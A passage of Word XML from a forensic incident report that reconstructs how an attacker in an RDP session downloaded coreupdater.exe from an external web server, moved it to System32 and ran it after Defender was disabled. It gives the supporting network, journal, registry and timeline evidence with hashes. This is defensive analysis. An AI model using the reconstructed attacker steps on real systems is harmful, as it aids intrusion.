        <w:t>Interpretation: the attacker, interactively in the RDP session as C137\Administrator, opened the legacy Edge (first run for this profile: microsoftedgewelcome at pcap 02:39:05), typed the IP of the attacker web server (plain HTTP directory listing, likely python http.server-type), saved coreupdater.exe to Downloads, moved it to System32 and launched it. The MOTW was present at download (StreamChange at save time) and was removed at 03:40:49 at the moment of execution, which matches the SmartScreen checkappexec exchange: the most likely explanation is the user clicking through the SmartScreen/'Open File – Security Warning' prompt ('Run anyway' / unchecking 'Always ask'), which deletes Zone.Identifier. Alternative (less likely): manual Unblock-File/Properties→Unblock in the same second. Exact HostUrl/ReferrerUrl content is not recoverable (ADS gone, not found in $LogFile text). Defender had been disabled at 03:39:45 just before the download (F-007). Network (pcap) + disk ($UsnJrnl/MRU) + Windows Timeline are independent sources.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Evidence (17)</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02:39:26.940438</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>HTTP (Suricata)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>HTTP request</w:t>
              <w:br/>
              <w:t>/</w:t>
              <w:br/>
              <w:t>http_hostname=194.61.24.102 | http_http_method=GET | http_status=200 | http_http_user_agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19041 | http_http_content_type=text/html | http_length=228 | src_ip=10.42.85.115 | dest_ip=194.61.24.102</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>suricata/case001.pcap/eve_http.jsonl#153</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 02:39:58.411571</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>HTTP (Suricata)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>HTTP request</w:t>
              <w:br/>
              <w:t>/coreupdater.exe</w:t>
              <w:br/>
              <w:t>http_hostname=194.61.24.102 | http_http_method=GET | http_status=200 | http_http_user_agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19041 | http_http_content_type=application/x-msdos-program | http_length=7168 | src_ip=10.42.85.115 | dest_ip=194.61.24.102</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>suricata/case001.pcap/eve_http.jsonl#156</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 02:39:26.941704</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Files transferred (Suricata)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>file transferred over the network</w:t>
              <w:br/>
              <w:t>/</w:t>
              <w:br/>
              <w:t>app_proto=http | http_hostname=194.61.24.102 | src_ip=194.61.24.102 | dest_ip=10.42.85.115 | fileinfo_size=228 | fileinfo_sha256=6978f8fa2bf5afbe1a074401b923ead519ce89471d83376f5cfda50c12bc2d77 | fileinfo_md5=614645af648513231c283090faa5c469 | fileinfo_state=CLOSED</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>suricata/case001.pcap/eve_fileinfo.jsonl#137</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 02:39:58.412735</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Files transferred (Suricata)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>file transferred over the network</w:t>
              <w:br/>
              <w:t>/coreupdater.exe</w:t>
              <w:br/>
              <w:t>app_proto=http | http_hostname=194.61.24.102 | src_ip=194.61.24.102 | dest_ip=10.42.85.115 | fileinfo_size=7168 | fileinfo_sha256=10f3b92002bb98467334161cf85d0b1730851f9256f83c27db125e9a0c1cfda6 | fileinfo_md5=eed41b4500e473f97c50c7385ef5e374 | fileinfo_state=CLOSED</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>suricata/case001.pcap/eve_fileinfo.jsonl#138</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:39:57.907806</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$UsnJrnl:$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>USN $J</w:t>
              <w:br/>
              <w:t>F:\Users\Administrator\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\AC\#!001\MicrosoftEdge\Cache\ELJ4KX67\coreupdater[1].exe</w:t>
              <w:br/>
              <w:t>FileCreate [Archive|NotContentIndexed] entry=24493-3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_usnjrnl/usnjrnl.csv#35845</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\$Extend\$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:40:00.847956</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$UsnJrnl:$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>USN $J</w:t>
              <w:br/>
              <w:t>F:\Users\Administrator\Downloads\coreupdater.exe.b1jhvkh.partial</w:t>
              <w:br/>
              <w:t>FileCreate [Archive] entry=26213-4</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_usnjrnl/usnjrnl.csv#35860</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\$Extend\$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:40:00.863618</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$UsnJrnl:$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>USN $J</w:t>
              <w:br/>
              <w:t>F:\Users\Administrator\Downloads\coreupdater.exe.b1jhvkh.partial</w:t>
              <w:br/>
              <w:t>NamedDataExtend|StreamChange [Archive] entry=26213-4</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_usnjrnl/usnjrnl.csv#35876</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\$Extend\$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:40:00.863618</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$UsnJrnl:$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>USN $J</w:t>
              <w:br/>
              <w:t>F:\Users\Administrator\Downloads\coreupdater.exe</w:t>
              <w:br/>
              <w:t>RenameNewName|Close [Archive] entry=26213-4</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_usnjrnl/usnjrnl.csv#35889</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\$Extend\$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:40:42.254194</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$UsnJrnl:$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>USN $J</w:t>
              <w:br/>
              <w:t>F:\Windows\System32\coreupdater.exe</w:t>
              <w:br/>
              <w:t>RenameNewName [Archive] entry=26213-4</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_usnjrnl/usnjrnl.csv#35942</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\$Extend\$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:40:49.317328</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$UsnJrnl:$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>USN $J</w:t>
              <w:br/>
              <w:t>F:\Windows\System32\coreupdater.exe</w:t>
              <w:br/>
              <w:t>StreamChange [Archive] entry=26213-4</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_usnjrnl/usnjrnl.csv#36064</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\$Extend\$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:40:00.691657</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: OpenSavePidlMRU</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Opened/saved via dialog box</w:t>
              <w:br/>
              <w:t>This PC\Downloads\coreupdater.exe</w:t>
              <w:br/>
              <w:t>exe mru=0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/20261025191813/recmd_kroll_F_OpenSavePidlMRU.csv#2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:39:29</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Windows Timeline (ActivitiesCache)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Activity: start ; Activity: last modified</w:t>
              <w:br/>
              <w:t>Microsoft.MicrosoftEdge_8wekyb3d8bbwe!MicrosoftEdge</w:t>
              <w:br/>
              <w:t>Directory listing for / (Microsoft Edge) http://194.61.24.102/ (http://194.61.24.102/) type=ExecuteOpen</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>wxtcmd/F/Users/Administrator/AppData/Local/ConnectedDevicesPlatform/L.Administrator/20261025201827_Administrator_Activity.csv#7</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Users\Administrator\AppData\Local\ConnectedDevicesPlatform\L.Administrator\ActivitiesCache.db</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:39:29</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Windows Search (activity history)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Activity: start</w:t>
              <w:br/>
              <w:t>http://194.61.24.102/</w:t>
              <w:br/>
              <w:t>Microsoft Edge Directory listing for / Microsoft.MicrosoftEdge_8wekyb3d8bbwe!MicrosoftEdge</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>sidr/DESKTOP-SDN1RPT_Activity_History_Report_20261025_191826.918732700.csv#29</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\ProgramData\Microsoft\search\data\applications\windows\Windows.edb</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 02:40:45.794820</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>TLS (Suricata)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>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w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>suricata/case001.pcap/eve_tls.jsonl#16329</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 02:40:49.938222</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>TLS (Suricata)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>TLS handshake</w:t>
              <w:br/>
              <w:t>checkappexec.microsoft.com</w:t>
              <w:br/>
              <w:t>tls_sni=checkappexec.microsoft.com | dest_ip=23.98.151.170 | dest_port=443 | tls_version=TLS 1.2 | tls_subject=CN=smartscreen.microsoft.com | tls_issuerdn=C=US, ST=Washington, L=Redmond, O=Microsoft Corporation, OU=Microsoft IT, CN=Microsoft IT TLS CA 1 | tls_ja3_hash=28a2c9bd18a11de089ef85a160da29e4 | tls_ja3s_hash=986571066668055ae9481cb84fda634a</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>suricata/case001.pcap/eve_tls.jsonl#16333</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 02:39:05.286189</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>TLS (Suricata)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>TLS handshake</w:t>
              <w:br/>
              <w:t>microsoftedgewelcome.microsoft.com</w:t>
              <w:br/>
              <w:t>tls_sni=microsoftedgewelcome.microsoft.com | dest_ip=52.171.136.200 | dest_port=443 | tls_version=TLS 1.2 | tls_subject=C=US, ST=WA, L=Redmond, O=Microsoft Corporation, OU=Microsoft Corporation, CN=microsoftedgewelcome.microsoft.com | tls_issuerdn=C=US, ST=Washington, L=Redmond, O=Microsoft Corporation, OU=Microsoft IT, CN=Microsoft IT TLS CA 2 | t</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
